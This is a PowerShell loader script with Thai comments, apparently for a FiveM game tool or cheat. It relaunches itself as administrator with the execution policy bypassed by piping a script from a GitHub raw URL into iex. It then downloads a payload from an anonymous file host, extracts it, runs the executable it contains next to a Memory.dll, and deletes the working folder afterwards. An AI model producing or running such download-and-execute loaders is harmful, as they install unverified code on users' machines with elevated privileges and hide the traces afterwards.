# 1. ขอสิทธิ์ Administrator อัตโนมัติ (แก้ไข Syntax ใหม่ให้แม่นยำ)
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"iex (Invoke-RestMethod 'https://raw.githubusercontent.com/potae112/Cmdfreefire/main/dugduy.ps1')`""
    Start-Process powershell.exe -ArgumentList $arguments -Verb RunAs
    exit
}

# 2. ตั้งค่าพื้นที่ทำงาน
$url = "https://files.catbox.moe/0ukxya.dll" # แนะนำให้เปลี่ยนต้นทางเป็นไฟล์ .zip
$workDir = "$env:LOCALAPPDATA\FiveM_Ultra_Tool"
$zipPath = Join-Path $workDir "package.zip"

# ล้างโฟลเดอร์เก่า
if (Test-Path $workDir) { 
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue 
}
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# 3. ดาวน์โหลดไฟล์
Write-Host "[*] Downloading Package..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing
} catch {
    Write-Host "[!] Download Failed: $($_.Exception.Message)" -ForegroundColor Red
    Pause; exit
}

# 4. แตกไฟล์ (ใช้ tar รองรับ .zip ใน Windows 10/11)
Write-Host "[*] Extracting Files..." -ForegroundColor Cyan
if (Test-Path $zipPath) {
    # ใช้ tar -xf สำหรับแตกไฟล์
    cmd /c "tar -xf `"$zipPath`" -C `"$workDir`""
}

# 5. ตรวจสอบไฟล์และจัดเตรียม Environment
$exe = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
$dllName = "Memory.dll"
$dllPath = Join-Path $workDir $dllName

if (!(Test-Path $dllPath)) {
    Write-Host "[!] Searching for $dllName in subfolders..." -ForegroundColor Yellow
    $foundDll = Get-ChildItem -Path $workDir -Filter $dllName -Recurse | Select-Object -First 1
    if ($foundDll) { 
        Copy-Item $foundDll.FullName -Destination $workDir 
    }
}

# 6. รันโปรแกรม
if ($exe) {
    Write-Host "[+] Found Executable: $($exe.FullName)" -ForegroundColor Green
    Write-Host "[*] Launching System..." -ForegroundColor White
    
    try {
        # รันโดยกำหนด WorkingDirectory เพื่อให้เรียก DLL ได้ถูกต้อง
        Start-Process -FilePath $exe.FullName -WorkingDirectory $exe.DirectoryName -Wait
    } catch {
        Write-Host "[!] Failed to start process." -ForegroundColor Red
    }
} else {
    Write-Host "[!] Error: No executable found in the package." -ForegroundColor Red
    Pause
}

# 7. ล้างไฟล์ชั่วคราวหลังปิดโปรแกรม (Cleanup)
Write-Host "[*] Cleaning up temporary files..." -ForegroundColor Gray
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue